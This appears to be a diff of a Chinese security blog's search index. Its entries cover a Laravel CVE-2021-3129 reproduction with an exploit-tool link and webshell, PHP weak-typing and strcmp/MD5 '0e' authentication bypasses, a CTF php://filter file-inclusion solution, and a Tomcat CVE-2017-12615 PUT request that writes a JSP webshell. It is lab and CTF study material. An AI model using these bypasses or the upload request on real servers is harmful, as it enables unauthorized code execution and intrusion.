+<p><img src="/images/image-20230910203844643.png" alt="image-20230910203844643"></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里也可直接使用工具生成webshell进行连接(这里使用的是哥斯拉)</p>
+<p>github地址：<a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP" target="_blank" rel="noopener">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
+<p><img src="https://img-blog.csdnimg.cn/4459b03ef53f41acab26d864a976a9ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p><img src="/images/image-20230910204850323.png" alt="image-20230910204850323"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用了file_get_contents()去读取了一个可控的路径参数，所以这里可以通过phar://协议去触发phar反序列化</p>
+<p>既然路径可控，那么首先想到的就是log文件，虽然log不能直接被当做php执行，但是有了file_get_contents+phar就可以；我们修改可控的viewfile参数后看看log中是什么样的</p>
+<p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/ez9hcsiijj.png" alt="img"></p>
+<p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/kyb4hlb7rv.png" alt="img"></p>
+<p>可以看到日志中写入了3次test，那么怎么才能只保留我们最后的一个payload呢，这里就可以使用filter做清空字符以及去除多余字符的方法。</p>
+<h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><p>1.使用白名单限制相关web项目的访问来降低风险；</p>
+<p>2.将 Laravel 框架升级至8.4.3及其以上版本，或者将facade ignition组件升级至 2.5.2 及其以上版本。</p>
+<p><strong>参考链接：</strong></p>
+<p><a href="https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA</a></p>
+<p><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p>
+<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php</title>
+    <url>/2018/08/10/php/</url>
+    <content><![CDATA[<p>php的详细使用可以参考<a href="http://php.net/manual/zh/" target="_blank" rel="noopener">http://php.net/manual/zh/</a></p>
+<p>php关于==号是这样处理的，如果一边是整型，另一边也需要是整型。</p>
+<a id="more"></a>
+<pre><code>0e545993274517709034328855841020
+</code></pre><p>这是一个整数，在php里是理解为0*10^4549…20的意思，那么其值是0</p>
+<p>同样</p>
+<pre><code>0e342768416822451524974117254469
+</code></pre><p>这是一个整数，在php里是理解为0*10^34..69的意思，那么其值是0，两者就相等了</p>
+<p>举一个反面的例子</p>
+<p>1e1和1e2</p>
+<p>这里1e1=1<em>10^1=10，1e2=1</em>10^2=100</p>
+<p>所以1e1 == 1e2这是false，但是</p>
+<p>100 == 1e2 这是true，为什么呢，因为1e2先转为整型，是100</p>
+<p>注意，对于e是指幂次。而其他26字符并不具有此能力。</p>
+<p>参考：</p>
+<p><a href="http://php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.comparison.php</a></p>
+<pre><code>&lt;?php
+var_dump(0 == &quot;all&quot;); // 0 == 0 -&gt; true
+var_dump(&quot;1&quot; == &quot;01&quot;); // 1 == 1 -&gt; true
+var_dump(&quot;10&quot; == &quot;1e1&quot;); // 10 == 10 -&gt; true
+var_dump(100 == &quot;1e2&quot;); // 100 == 100 -&gt; true
+
+switch (&quot;a&quot;) {
+case 0:
+    echo &quot;0&quot;;
+    break;
+case &quot;a&quot;: // never reached because &quot;a&quot; is already matched with 0
+    echo &quot;a&quot;;
+    break;
+}
+?&gt;
+</code></pre><p>做比较，会先转换类型， all字符串转换成数字类型(int)就是 0 ， 所以中间成立返回真。</p>
+<pre><code>var_dump(08==8)这个结果返回是false，
+var_dump(09==9)这个结果返回也是false，
+而var_dump(07===7)返回true（var_dump(07==7)同样返回true。）
+</code></pre><p>php手册上有详细说明，整形以0开头的为八进制数，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略，即09实际上为0，08也同理</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php弱类型</title>
+    <url>/2018/11/04/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
+    <content><![CDATA[<h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><p>php中有两种比较的符号 == 与 ===</p>
+<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较，如果类型不同直接返回不相等</p>
+<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
+<a id="more"></a>
+<p>（如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行），例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 var_dump(&quot;admin&quot;==0);  //true</span><br><span class="line">3 var_dump(&quot;1admin&quot;==1); //true</span><br><span class="line">4 var_dump(&quot;admin1&quot;==1) //false</span><br><span class="line">5 var_dump(&quot;admin1&quot;==0) //true</span><br><span class="line">6 var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure>
+<p>观察上述代码，得到：</p>
+<p>1、”admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</p>
+<p>2、”1admin”==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是”admin1”被转化成了0</p>
+<p>3、 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
+<p>==注意 #f44336==：</p>
+<p>当一个字符串被当作一个数值来取值，其结果和类型如下:</p>
+<p>如果该字符串没有包含’.’,’e’,’E’并且其数值在整形的范围之内，该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 $test=1 + &quot;10.5&quot;; // $test=11.5(float)</span><br><span class="line">3 $test=1+&quot;-1.3e3&quot;; //$test=-1299(float)</span><br><span class="line">4 $test=1+&quot;bob-1.3e3&quot;;//$test=1(int)</span><br><span class="line">5 $test=1+&quot;2admin&quot;;//$test=3(int)</span><br><span class="line">6 $test=1+&quot;admin2&quot;;//$test=1(int)</span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以就解释了”admin1”==1 =&gt;False 的原因</p>
+<h2 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h2><p>md5开头是0e的字符串，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0，md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过，例如：</p>
+<p>QNKCDZO<br>0e830400451993494058024219903391</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s155964671a<br>0e342768416822451524974117254469</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s1091221200a<br>0e940624217856561557816327384675</p>
+<h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;message&apos;])) &#123;</span><br><span class="line">    $message = json_decode($_POST[&apos;message&apos;]);</span><br><span class="line">    $key =&quot;*********&quot;;</span><br><span class="line">    if ($message-&gt;key == $key) &#123;</span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">     echo &quot;~~~~&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”(字符串)这种形式绕过</p>
+<p>最终上传 message={“key”:0}</p>
+<h2 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search / is_array绕过"></a>array_search / is_array绕过</h2><p>in_array和array_search会对类型进行强制转换，并且是==进行比较，所以可以绕过。</p>
+<p>mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )</p>
+<p>$needle，$haystack必需，$strict可选  函数判断$haystack中的值是否存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 $a=array(0,1);</span><br><span class="line">3 var_dump(array_search(&quot;admin&quot;,$a)); // int(0) =&gt; 返回键值0</span><br><span class="line">4 var_dump(array_seach(&quot;1admin&quot;,$a));  // int(1) ==&gt;返回键值1</span><br><span class="line">5 ?&gt;</span><br></pre></td></tr></table></figure>
+<p>array_search函数 类似于== 也就是$a==”admin” 当然是$a=0  当然如果第三个参数为true则就不能绕过</p>
+<h2 id="strcmp漏洞绕过"><a href="#strcmp漏洞绕过" class="headerlink" title="strcmp漏洞绕过"></a>strcmp漏洞绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1 &lt;?php</span><br><span class="line"> 2     $password=&quot;***************&quot;</span><br><span class="line"> 3      if(isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line"> 4 </span><br><span class="line"> 5         if (strcmp($_POST[&apos;password&apos;], $password) == 0) &#123;</span><br><span class="line"> 6             echo &quot;Right!!!login success&quot;;n</span><br><span class="line"> 7             exit();</span><br><span class="line"> 8         &#125; else &#123;</span><br><span class="line"> 9             echo &quot;Wrong password..&quot;;</span><br><span class="line">10         &#125;</span><br><span class="line">11 ?&gt;</span><br></pre></td></tr></table></figure>
+<p>strcmp是比较两个字符串，如果str1&lt;str2 则返回<0 如果str1大于str2返回="">0 如果两者相等 返回0</0></p>
+<p>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</p>
+<p>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断相等</p>
+<h2 id="empty和isset函数"><a href="#empty和isset函数" class="headerlink" title="empty和isset函数"></a>empty和isset函数</h2><p>1）变量为：0，”0”,null,’’,false,array()时，使用empty函数，返回的都为true</p>
+<p>2）变量未定义或者为null时，isset函数返回的为false,其他都未true</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a = null;</span><br><span class="line">$b = &apos;&apos;;</span><br><span class="line">$c = 0;</span><br><span class="line">$d = &quot;0&quot;;</span><br><span class="line">$e = false;</span><br><span class="line">$f = array();</span><br><span class="line">var_dump(empty($a));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($b));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($c));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($d));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($e));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($f));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line"></span><br><span class="line">var_dump(isset($a));   //false</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($b));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($c));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($d));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($e));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($f));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($g));   //false</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php弱类型</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python笔记</title>
     <url>/2018/07/31/python%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<font size="4" face="黑体">今天做了一道过滤敏感词的python编程题，真是异常的纠结，现在给大家分享一下这道题:</font>
@@ -1062,6 +981,28 @@ for i in user:
       </tags>
   </entry>
   <entry>
+    <title>搭建博客</title>
+    <url>/2018/07/31/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>历经千辛万苦终于建立了自己的博客，心情自然是很高兴的，在此总结一下建立博客过程中遇到的问题。也分享一下一些搭建博客的教程链接：</p>
+<p><a href="https://blog.csdn.net/u012150360/article/details/72793482" target="_blank" rel="noopener">https://blog.csdn.net/u012150360/article/details/72793482</a></p>
+<a id="more"></a>
+<hr>
+<p><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengxiongZz/p/7707219.html</a></p>
+<p><a href="https://www.jianshu.com/p/863f3f2d1733" target="_blank" rel="noopener">https://www.jianshu.com/p/863f3f2d1733</a></p>
+<p>还有<a href="https://blog.csdn.net/qq_33699981/article/details/72716951" title="hexo的next主题个性化教程：打造炫酷网站" target="_blank" rel="noopener">hexo的next主题个性化教程：打造炫酷网站</a></p>
+<p>根据上面的三个教程基本就可以清楚地搭建自己的博客了，可能过程中还会遇到几个坑，下面是我搭建过程中遇到的坑，希望会有所帮助。</p>
+<p>就是在ssh-key配置时总是失败，经常会报这样的错误：</p>
+<pre><code>The authenticity of host &apos;github.com (192.30.255.112)&apos; can&apos;t be established.
+
+RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8 
+</code></pre><p>Google之后明白，少了一个known_hosts文件，本来密钥文件应该是三个，现在是两个，便报了这样的错误，此时选择yes回车之后，便可以了，同时生成了缺少的known_hosts文件：</p>
+<p>  <code>Are you sure you want to continue connecting (yes/no)? //输入yes，回车</code></p>
+]]></content>
+      <tags>
+        <tag>搭建博客</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>知识点</title>
     <url>/2018/10/29/%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
     <content><![CDATA[<h3 id="1-robots-txt协议"><a href="#1-robots-txt协议" class="headerlink" title="1. robots.txt协议"></a>1. robots.txt协议</h3><a id="more"></a>
@@ -1093,6 +1034,56 @@ for i in user:
       </categories>
       <tags>
         <tag>robots协议,正则</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2018/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="南邮文件包含ctf题"><a href="#南邮文件包含ctf题" class="headerlink" title="南邮文件包含ctf题"></a>南邮文件包含ctf题</h2><p><img src="https://i.imgur.com/5QJFWhR.png" alt=""></p>
+<a id="more"></a>
+<hr>
+<p><img src="https://i.imgur.com/7vQRioW.png" alt=""></p>
+<p><img src="https://i.imgur.com/gUBH2rU.png" alt=""></p>
+<p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，<br>从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。</p>
+<p>详细的本地文件包含漏洞介绍： <a href="https://www.cnblogs.com/wh4am1/p/6542398.html" target="_blank" rel="noopener">https://www.cnblogs.com/wh4am1/p/6542398.html</a></p>
+<p>我们从第三幅图中很明显的看出这是个php文件，但是无法通过查看源码得到有效信息，因此尝试使用php://filter获取源码。</p>
+<p>php://filter是PHP中的一个协议，利用这个协议我们可以解决一些ctf的题目，或者挖掘出一些漏洞。</p>
+<pre><code>php:// — 访问各个输入/输出流（I/O streams）php://input 是个可以访问请求的原始数据的只读流。
+
+php://filter 是一种设计用来允许过滤器程序在打开时成为流的封装协议。这对于单独具有完整功能的文件函数非常有用，否则就没有机会在读取内容之前将过滤器应用于流之上。
+
+该协议语法为：php://filter:/&lt;action&gt;=&lt;name&gt;
+
+比如 php://filter:/resource=http://www.baidu.com
+</code></pre><h3 id="使用-php-filter-获取网页内容："><a href="#使用-php-filter-获取网页内容：" class="headerlink" title="使用 php://filter 获取网页内容："></a>使用 php://filter 获取网页内容：</h3><pre><code>&lt;?php$url = &apos;http://www.phpfamily.cn&apos;;$data = file_get_contents(&apos;php://filter/resource=&apos; . $url);
+
+echo $data;  //输出结果我http://www.phpfamily.cn页面的内容
+</code></pre><h3 id="php-filter-的参数列表"><a href="#php-filter-的参数列表" class="headerlink" title="php://filter 的参数列表"></a>php://filter 的参数列表</h3><ul>
+<li>resource=&lt;要过滤的数据流&gt;          指定了你要筛选过滤的数据流。     （必选）</li>
+<li>read=&lt;读链的筛选列表&gt;     可以设定一个或多个过滤器名称，以管道符（|）分隔。 （可选）</li>
+<li>write=&lt;写链的筛选列表&gt;     可以设定一个或多个过滤器名称，以管道符（|）分隔。 （可选）</li>
+<li>&lt;；两个链的筛选列表&gt;     任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</li>
+</ul>
+<h3 id="read参数值可为"><a href="#read参数值可为" class="headerlink" title="read参数值可为"></a>read参数值可为</h3><p>string.strip_tags： 将数据流中的所有html标签清除</p>
+<p>string.toupper： 将数据流中的内容转换为大写</p>
+<p>string.tolower： 将数据流中的内容转换为小写</p>
+<p>convert.base64-encode： 将数据流中的内容转换为base64编码</p>
+<p>convert.base64-decode： 与上面对应解码为典型的文件包含漏洞。</p>
+<p>我们可以通过构造含有漏洞的语句，查看想要看的代码： file=php://filter/convert.base64-encode/resource=index.php 。再将得到的base64码解码即可。</p>
+<p>在这道题中，我们就可以通过构造这样的语句查看隐藏的代码，如下网址:</p>
+<p><img src="https://i.imgur.com/5m2c8p5.png" alt=""></p>
+<p>然后在进行base64解码得到flag</p>
+<p>flag:nctf{edulcni_elif_lacol_si_siht}</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>文件包含</tag>
+        <tag>LFI</tag>
+        <tag>CTF</tag>
+        <tag>php://filter</tag>
       </tags>
   </entry>
   <entry>
@@ -1273,25 +1264,34 @@ for i in range(0,30):#密码猜测
       </tags>
   </entry>
   <entry>
-    <title>搭建博客</title>
-    <url>/2018/07/31/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>历经千辛万苦终于建立了自己的博客，心情自然是很高兴的，在此总结一下建立博客过程中遇到的问题。也分享一下一些搭建博客的教程链接：</p>
-<p><a href="https://blog.csdn.net/u012150360/article/details/72793482" target="_blank" rel="noopener">https://blog.csdn.net/u012150360/article/details/72793482</a></p>
+    <title>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</title>
+    <url>/2022/10/18/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
+    <content><![CDATA[<p>Tomcat版本：8.5.19</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/tomcat/CVE-2017-12615/</span><br><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+<p>运行完成后访问<code>http://your-ip:8080</code>即可看到Tomcat的Example页面。</p>
 <a id="more"></a>
-<hr>
-<p><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengxiongZz/p/7707219.html</a></p>
-<p><a href="https://www.jianshu.com/p/863f3f2d1733" target="_blank" rel="noopener">https://www.jianshu.com/p/863f3f2d1733</a></p>
-<p>还有<a href="https://blog.csdn.net/qq_33699981/article/details/72716951" title="hexo的next主题个性化教程：打造炫酷网站" target="_blank" rel="noopener">hexo的next主题个性化教程：打造炫酷网站</a></p>
-<p>根据上面的三个教程基本就可以清楚地搭建自己的博客了，可能过程中还会遇到几个坑，下面是我搭建过程中遇到的坑，希望会有所帮助。</p>
-<p>就是在ssh-key配置时总是失败，经常会报这样的错误：</p>
-<pre><code>The authenticity of host &apos;github.com (192.30.255.112)&apos; can&apos;t be established.
-
-RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8 
-</code></pre><p>Google之后明白，少了一个known_hosts文件，本来密钥文件应该是三个，现在是两个，便报了这样的错误，此时选择yes回车之后，便可以了，同时生成了缺少的known_hosts文件：</p>
-<p>  <code>Are you sure you want to continue connecting (yes/no)? //输入yes，回车</code></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>参考：</p>
+<ul>
+<li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e</a></li>
+</ul>
+<p>漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>
+<p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接连接到docker开启的tomcat环境，文件直接上传到docker里面的那个tomcat中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接发送以下数据包即可在Web根目录写入shell：</span><br><span class="line"></span><br><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+<p>PUT方法向Tomcat中上传冰蝎马</p>
+<p><img src="/images/image-20230919094810254.png" alt="image-20230919094810254"></p>
+<p><img src="/images/image-20230919094820779.png" alt="image-20230919094820779"></p>
+<p>冰蝎连接</p>
+<p><img src="/images/image-20230919133124835.png" alt="image-20230919133124835"></p>
 ]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
       <tags>
-        <tag>搭建博客</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
 </search>
